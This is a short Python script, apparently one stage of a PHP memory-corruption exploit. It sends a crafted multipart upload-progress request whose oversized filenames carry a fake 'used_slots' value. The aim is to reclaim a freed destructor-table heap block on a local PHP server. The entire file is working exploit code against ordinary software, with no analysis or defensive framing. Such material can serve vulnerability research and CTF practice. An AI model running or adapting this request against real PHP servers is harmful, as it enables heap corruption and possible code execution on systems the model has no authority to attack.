#!/usr/bin/env python3
"""Send the upload-progress request that reclaims the stale destructor block.

Usage: send_b.py <port> <PHPSESSID> [<first-qword-hex> [<filename-len> [<parts>]]]
Each file part's filename is a raw buffer (default 4096 bytes, the size class of
var_dtor_entries); its first 8 bytes are the fake signed used_slots.
"""
import socket
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
first = int(sys.argv[3], 16) if len(sys.argv) > 3 else 0xFFFFFFFFFFFFFFFE
flen = int(sys.argv[4]) if len(sys.argv) > 4 else 4096
parts = int(sys.argv[5]) if len(sys.argv) > 5 else 1

filename = first.to_bytes(8, "little", signed=False) + b"Q" * (flen - 8)

boundary = b"----p2sB"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    b"x\r\n"
)
for i in range(parts):
    body += (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="f' + str(i).encode() + b'"; filename="' + filename + b'"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n" + b"A" * 1024 + b"\r\n"
    )
body += b"--" + boundary + b"--\r\n"

req = (
    b"POST /index.php HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n"
) + body

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(req)
resp = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        resp += chunk
except socket.timeout:
    pass
finally:
    s.close()
print(resp.split(b"\r\n", 1)[0].decode("latin-1"))
print(resp.split(b"\r\n\r\n", 1)[-1][:200].decode("latin-1", "replace").strip())
